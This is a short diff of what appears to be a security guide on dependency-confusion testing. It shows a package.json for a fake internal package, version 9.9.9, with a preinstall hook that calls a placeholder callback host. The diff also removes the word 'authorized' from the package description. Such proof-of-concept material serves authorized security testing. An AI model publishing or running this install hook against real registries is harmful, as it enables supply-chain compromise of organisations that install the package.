@@ -92,7 +92,7 @@ Routing note: after package-name enumeration, consider PoC only in authorized en
 {
   "name": "some-internal-package-name",
   "version": "9.9.9",
-  "description": "authorized dependency-confusion PoC only",
+  "description": "dependency-confusion PoC (lab)",
   "scripts": {
     "preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\""
   }
